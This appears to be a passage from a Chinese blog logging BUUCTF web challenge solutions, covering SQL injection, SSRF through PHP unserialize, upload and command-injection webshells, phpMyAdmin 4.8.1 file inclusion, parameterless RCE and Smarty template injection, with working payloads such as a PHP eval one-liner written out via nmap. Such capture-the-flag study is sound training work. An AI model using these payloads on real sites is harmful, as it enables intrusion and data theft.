alt="image-20210723170037720"></p><p><code>Twisted</code>版本为<code>10.2.0</code>，而目前(2020/10/28)<code>Twisted</code>最新版本已有<code>20.3.0</code>，这里使用的版本非常旧<br><code>10.2.0</code>版的<code>nodeprep.prepare()</code>对一些特殊的<code>Unicode</code>编码处理后会得到一个正常的字符。可以知道当使用了nodeprep.prepare()函数之后，如果我们先使用unicode的编码的字符，比如说 ᴬ ，使用该函数之后，他会先变成大写的A，再使用一次就会变成小写的a。</p><p>所以可以注册一个ᴬᴰᴹᴵᴺ用户再通过登录和修改密码两次令其变为admin</p><p><a href="https://unicode-table.com/en/">Basic Latin — ✔️ ❤️ ★ Unicode Character Table (unicode-table.com)</a>可以从这个网站查字符</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723172720848.png" alt="image-20210723172720848"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723172812674.png" alt="image-20210723172812674"></p><p>这里登录之后进行修改密码，则通过小写转换就会变为修改admin账户的密码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723181917454.png" alt="image-20210723181917454"></p><p><strong>三、弱密码</strong></p><p>用户admin密码为123</p><p>爆破或者试一试就能试出来密码</p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>进入后只有一个提交框，没啥思路，先用bp抓个包</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723205715453.png" alt="image-20210723205715453"></p><p>看见有个hint</p><p>select * from &#39;admin&#39; where password=md5($pass,true)</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723205633361.png" alt="image-20210723205633361"></p><p>然后猜这里应该要利用sql注入的，但我不会了x</p><p>看了一下说是要用ffifdyop来绕过，因为这个字符串经过md5之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是&#39; or &#39;6</p><p>就会构成万能密码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723210730068.png" alt="image-20210723210730068"></p><p>成功进入下一步，先查看源码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723210837745.png" alt="image-20210723210837745"></p><p>利用md5不能处理数组会返回null的特性就能绕过，接下来进行代码审计</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723210915141.png" alt="image-20210723210915141"></p><p>同样可以利用md5不能处理数组的特性</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723211130123.png" alt="image-20210723211130123"></p><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>先join一下，然后源码里有</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724215234506.png" alt="image-20210724215234506"></p><p>这里过滤了union select 中间可以加个注释符来当空格来绕过去</p><p>这个页面存在注入点，</p><p>有两种方法，一种是直接sql读文件，另一种是ssrf</p><p><strong>一.</strong></p><p>借助联合查询可以看到user()是root，所以直接猜文件位置</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220427222358992.png" alt="image-20220427222358992"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220427222419307.png" alt="image-20220427222419307"></p><p><strong>二.</strong></p><p>sql注入查到底，最终可以查到这些</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724221156289.png" alt="image-20210724221156289"></p><p>这里能看出来data是个序列化后的结果，但是不知道有什么用</p><p>看一眼这个</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220427223617802.png" alt="image-20220427223617802"></p><p>解码之后发现是百度首页的源码</p><p>然后扫一下发现</p><p>有robots.txt备份文件</p><pre class="language-none"><code class="language-none">&lt;?phpclass UserInfo&#123;    public $name &#x3D; &quot;&quot;;    public $age &#x3D; 0;    public $blog &#x3D; &quot;&quot;;    public function __construct($name, $age, $blog)    &#123;        $this-&gt;name &#x3D; $name;        $this-&gt;age &#x3D; (int)$age;        $this-&gt;blog &#x3D; $blog;    &#125;    function get($url)    &#123;        $ch &#x3D; curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output &#x3D; curl_exec($ch);        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode &#x3D;&#x3D; 404) &#123;            return 404;        &#125;        curl_close($ch);        return $output;    &#125;    public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;    public function isValidBlog ()    &#123;        $blog &#x3D; $this-&gt;blog;        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);    &#125;&#125;</code></pre><p>好，看不懂了（</p><p>抄一下别人的分析</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php  class UserInfo&#123;    public $name &#x3D; &quot;&quot;;    public $age &#x3D; 0;    public $blog &#x3D; &quot;&quot;;     public function __construct($name, $age, $blog)    &#123;        $this-&gt;name &#x3D; $name;        $this-&gt;age &#x3D; (int)$age;        $this-&gt;blog &#x3D; $blog;    &#125;     function get($url)    &#123;        $ch &#x3D; curl_init();        &#x2F;*curl_init()：初始化一个 cURL 会话并且全部的选项都被设置后被调用*&#x2F;         curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        &#x2F;*            curl_setopt — 为给定的cURL会话句柄设置一个选项。                说明：                    bool curl_setopt ( resource $ch , int $option , mixed $value )                参数:                    ch：由 curl_init() 返回的 cURL 句柄。                    option：需要设置的CURLOPT_XXX选项。                    value：将设置在option选项上的值。                    对于下面的这些option的可选参数，value应该被设置一个bool类型的值：                        CURLOPT_RETURNTRANSFER：将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。                    对于下面的这些option的可选参数，value应该被设置一个string类型的值：                        CURLOPT_URL：需要获取的URL地址，也可以在curl_init()函数中设置。                                                                          ###################                        文件流的形式:指的是在传递过程中的文件,比如你上传一张图片,那么他不是以一个完整的图片传输的,是将文件按特定编码的字符传输.这个就是文件流        *&#x2F;        $output &#x3D; curl_exec($ch);        &#x2F;*curl_exec ：执行 cURL 会话*&#x2F;        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);        &#x2F;*            curl_getinfo — 获取一个cURL连接资源句柄的信息                说明：                       mixed curl_getinfo ( resource $ch [, int $opt &#x3D; 0 ] )获取最后一次传输的相关信息。                参数：                      ch 由 curl_init() 返回的 cURL 句柄。                      opt：这个参数可能是以下常量之一:                            CURLINFO_HTTP_CODE : 最后一个收到的HTTP代码        *&#x2F;                 if($httpCode &#x3D;&#x3D; 404) &#123;            return 404;        &#125;        curl_close($ch);         return $output;    &#125;     public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;     public function isValidBlog ()    &#123;        $blog &#x3D; $this-&gt;blog;        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);    &#125;        cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。    cURL还包含了用于程序开发的libcurl。PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。PHP中使用cURL实现Get和Post请求的方法这些函数在PHP 4.0.2中被引入。 </code></pre><p>新知识：这里利用了ssrf漏洞</p><p><a href="https://www.freebuf.com/company-information/220086.html">SSRF漏洞攻击原理及防御方案 - FreeBuf网络安全行业门户</a></p><p><a href="https://blog.csdn.net/fageweiketang/article/details/88983921"> SSRF 漏洞记录_发哥微课堂-CSDN博客</a></p><p><a href="https://www.t00ls.net/articles-41070.html">SSRF漏洞(原理&amp;绕过姿势) - T00ls.Net</a></p><p>SSRF（Server-Side Request Forgery）也属于应用层上的一个漏洞类型，用一个最简单的例子来理解这个漏洞：比如一个添加图文的功能，填入标题内容和封面图然后提交在网站前台显示，对于这个功能的图片它除了可以让你上传以外，还支持填入远程图片地址，如果你填入了远程的图片地址，则该网站会加载远程图过来进行显示，而如果程序写法不严谨或者过滤不严格，则加载图片地址的这个功能可能就可以包含进行一些恶意的脚本文件，或者你输入内网的 ip 或者一些系统的文件都会被解析执行，这个我们一般叫它 SSRF 即服务端请求伪造。</p><p>curl 使用的经典过程，初始化，然后设置访问的地址，随后执行，最后关闭。</p><p>将URL换成file://的形式，就可以读取本地文件。</p><p>这里我们要访问的是flag.php，所以按照之前sql注入得出来的序列化内容进行修改</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724225352853.png" alt="image-20210724225352853"></p><p>最终payload为</p><pre class="language-none"><code class="language-none">?no&#x3D;-1%20union&#x2F;**&#x2F;select 1,(select%20group_concat(no,username,passwd,data)%20from%20users),3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:27:&quot;file:&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</code></pre><p>看一下源码，找到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724225327036.png" alt="image-20210724225327036"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210724225342961.png" alt="image-20210724225342961"></p><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>这个和之前一个文件上传的题差不多，上传时过滤了ph后缀名，所以要上传个图片马，同时还要上传个.htaccess文件解析图片马，用bp抓包把类型改成image/jpeg就行</p><p>然后菜刀连一下在根目录里就能找到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210803230538636.png" alt="image-20210803230538636"></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>先直接贴参考的文章了</p><p><a href="https://blog.csdn.net/tm_1024/article/details/107393796?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">BUUCTF 2018]Online Tool_题解_风过江南乱的博客-CSDN博客</a></p><p>[<a href="https://blog.csdn.net/weixin_44077544/article/details/102835099?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">BUUCTF 2018]Online Tool_沐目的博客-CSDN博客</a></p><p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/#2-CVE-2016-10045">谈谈escapeshellarg参数绕过和注入的问题 (lmxspace.com)</a></p><p><a href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇 (seebug.org)</a></p><p> <a href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167/">BUUCTF 2018]Online Tool - nmap\escapeshellarg与escapeshellcmd连用_M4xlmum的博客-CSDN博客</a></p><p>先是代码审计，又是没见过的东西</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804001517374.png" alt="image-20210804001517374"></p><p>第一个if语句好像没啥用</p><p>在PHP 中使用 $_SERVER[&quot;REMOTE_ADDR&quot;] 来取得客户端的 IP地址，但如果客户端是使用代理服务器来访问，那取到的就</p><p>是代理服务器的 IP 地址，而不是真正的客户端 IP 地址。要想透过代理服务器取得客户端的真实 IP 地址，就要使用</p><p>$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] 来读取。</p><p>不过要注意的事，并不是每个代理服务器都能用 $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] 来读取客户端的真实IP，有些用此</p><p>方法读取到的仍然是代理服务器的 IP。</p><p>第二个if语句是要求传入一个参数然后利用escapeshellarg和escapeshellcmd两个函数的漏洞实现system命令执行</p><pre class="language-txt" data-language="txt"><code class="language-txt">escapeshellarg，会在字符串中所有的单引号（包括成对存在闭合的）前添加一个&#39;\&#39; ，若已经用\转义，则会用&#39;\&#39;&#96;替换\，最后将整个变量用单引号包裹。escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。反斜线（\）会在以下字符之前插入： &amp;#;&#96;|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A 和 \xFF。’ 和 “ 仅在不配对的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</code></pre><p>这个漏洞类似这种</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804005109985.png" alt="image-20210804005109985"></p><p>mkdir命令是Linux中的新建文件夹</p><p>chdir改变目录</p><p>最后就是system的命令执行了，这里面是nmap的一些命令</p><p>-T5 :扫描等级,越大越快,越快越不安全,最好设置为-T4</p><p>-sT :TCP connent 扫描,不太安全(留下记录信息),而且速度较慢,一般先使用-sS测试</p><p>-Pn :禁用ping</p><p>-host-timeout 2:设置扫描一台主机的时间，以毫秒为单位。</p><p>-F :快速扫描模式，只扫描在nmap-services文件中列出的端口。</p><p>-oG test.txt: 将扫描结果生成 test.txt 文件</p><p>接下来就是想办法利漏洞给里面传入一个一句话木马</p><p>payload</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;</code></pre><p>然后经过escapeshellarg和escapeshellcmd两个函数就会变成类似这种</p><pre class="language-txt" data-language="txt"><code class="language-txt">&#39; &#39;\\&#39;&#39;\&lt;\?php eval\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39; &#39;</code></pre><p>这里单引号都闭合了不会影响到传入的一句话木马</p><p>之后就可以用菜刀连接找flag了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804004604659.png" alt="image-20210804004604659"></p><p> e9612257fa1c5134d014e95a7440d357</p><p>这是上传后的地址</p><p>菜刀连一下<a href="http://d26a51d3-a34a-46e5-9be3-80b3a129befb.node4.buuoj.cn/">http://d26a51d3-a34a-46e5-9be3-80b3a129befb.node4.buuoj.cn/</a> e9612257fa1c5134d014e95a7440d357/1.php</p><p>根目录找到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804004814988.png" alt="image-20210804004814988"></p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>首先是个登录框</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808124202495.png" alt="image-20210808124202495"></p><p>看一下help的内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808124233134.png" alt="image-20210808124233134"></p><p>试试抓包然后改一下请求方式后会下载一个word文档，没啥用</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808124659707.png" alt="image-20210808124659707"></p><p>这里是WEB-INF/web.xml泄露</p><pre class="language-none"><code class="language-none">WEB-INF主要包含一下文件或目录:&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><p>漏洞成因</p><pre class="language-txt" data-language="txt"><code class="language-txt">通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^&#x2F;WEB-INF&#x2F;* &#123; deny all; &#125; 或者return 404; 或者其他！</code></pre><p>漏洞利用</p><pre class="language-txt" data-language="txt"><code class="language-txt">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre><p>所以先访问一下WEB-INF/web.xml</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808125056946.png" alt="image-20210808125056946"></p><p>这个路径com.wm.ctf.IndexController应该和flag有关</p><p>所以试试访问一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808131605144.png" alt="image-20210808131605144"></p><p>看到有块类似base64</p><p>解码得到flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808131703878.png" alt="image-20210808131703878"></p><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p><a href="https://blog.csdn.net/qq_24033605/article/details/116855740?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">GXYCTF2019]禁止套娃_TzZzEZ-web的博客-CSDN博客</a></p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com)</a></p><p>题目存在git泄露，用GitHack扫一下得到源码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808134953571.png" alt="image-20210808134953571"></p><p>可以猜到这里利用了eval进行命令执行，但是过滤了很多东西</p><pre class="language-none"><code class="language-none">1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。2.过滤了常用的几个伪协议，不能以伪协议读取文件。3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。4.正则匹配掉了et&#x2F;na&#x2F;info等关键字，很多函数都用不了。5：eval($_GET[&#39;exp&#39;]); 典型的无参数RCE</code></pre><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE">PHP Parametric Function RCE · sky&#39;s blog (skysec.top)</a>关于无参数rce</p><p>首先要读取目录内容，</p><p>可以用print_r(scandir(&#39;.&#39;));</p><p>但是因为不能传参，所以要想把.用函数代替</p><p>这里有两个函数可以利用</p><pre class="language-none"><code class="language-none">localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是.current() 返回数组中的当前单元, 默认取第一个值</code></pre><p>所以current(localeconv())永远是个.</p><p>也就可以用print_r(scandir(current(localeconv())));来读目录</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808142444979.png" alt="image-20210808142444979"></p><p>可以看到flag就在flag.php中</p><p>现在要想办法把它读出来</p><p>这里可以利用array_reverse()和next函数</p><p>通过array_reverse() 函数返回翻转顺序的数组。<br>（反转之后flag.php被放在第二个数组之中）<br>next() 函数将内部指针指向数组中的下一个元素，并输出。<br>payload为：</p><pre class="language-php" data-language="php"><code class="language-php">？exp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808144017189.png" alt="image-20210808144017189"></p><p>也可以利用</p><p>array_flip()交换数组的键和值</p><p>array_rand()从数组中随机取出一个或多个单元</p><p>最后再利用readfile函数读出文件或者用show_source让它高亮显示</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808144253823.png" alt="image-20210808144253823"></p><p>由于array_rand是随机的，所以要多刷新几次才可能会显示flag.php的内容</p><h2 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h2><p>御剑是真的不好用。。。phpmyadmin路径死活扫不出来</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808154118587.png" alt="image-20210808154118587"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808150229023.png" alt="image-20210808150229023"></p><p>这里phpmyadmin版本是4.8.1</p><p>由于phpmyadmin4.8.0-4.8.1存在文件包含漏洞</p><p>直接用payload打</p><p>?target=db_datadict.php%253f/../../../../../../../../flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808150605205.png" alt="image-20210808150605205"></p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>这道题第一眼看上去像是本地访问的题目</p><p>但是hint有感觉不太像</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808201950916.png" alt="image-20210808201950916"></p><p>抓包修改xff头后就没思路了，查了一下发现是smarty模板注入</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202158856.png" alt="image-20210808202158856"></p><p>看到这里支持逻辑运算，可以直接解析，所以就可以利用系统命令来读flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202307003.png" alt="image-20210808202307003"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202546370.png" alt="image-20210808202546370"></p><p><strong>Smarty SSTI利用</strong></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/107556915">(1条消息) PHP的模板注入（Smarty模板）_WHOAMIAnony的博客-CSDN博客_smarty模板注入</a></p><p>Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。</p><p><strong>漏洞确认</strong></p><p>一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808202952019.png" alt="image-20210808202952019"></p><p><strong>常规利用方式</strong></p><p>Smarty支持使用<code>&#123;php&#125;&#123;/php&#125;</code>标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。</p><p><strong>{literal} 标签</strong></p><blockquote><p><strong><code>&#123;literal&#125;</code>可以让一个模板区域的字符原样输出。</strong> 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p></blockquote><p>若该题环境为php5，则可以</p><pre class="language-none"><code class="language-none">&lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt;</code></pre><p><strong>静态方法</strong></p><p>通过self获取Smarty类再调用其静态方法实现文件读写被网上很多文章采用。</p><p><strong>在3.1.30的Smarty版本中官方已经把该静态方法删除</strong></p><p><strong>{if}标签</strong><br>官方文档中看到这样的描述：</p><p>Smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||, or, &amp;&amp;, and, is_array(), 等等，如：{if is_array($array)}{/if}</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808203333956.png" alt="image-20210808203333956"></p><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>第一部分</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210809002920929.png" alt="image-20210809002920929"></p><p>可以用伪协议读取，但是不知道为什么我用hackbar时没成功</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808225403216.png" alt="image-20210808225403216"></p><p>也可以用这个payload</p><pre class="language-none"><code class="language-none">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBoYXZlIGEgZHJlYW0&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php</code></pre><p>base64解码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808225453870.png" alt="image-20210808225453870"></p><p>当pattern传入的正则表达式带有/e时，存在命令执行，即当匹配到符合正则表达式的字符串时，第二个参数的字符串可被当做代码来执行。思路是利用这个代码执行，执行源码中的getFlag()函数，在传入cmd参数，再利用getFlag中的eval（）函数，再进行一个代码执行。</p><p><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行 - 先知社区 (aliyun.com)</a></p><p>这里第二个参数固定为<code>strtolower(&quot;\\1&quot;)</code>这里的<code>\\1</code>实际上体现为<code>\1</code></p><p> <strong>\1</strong> 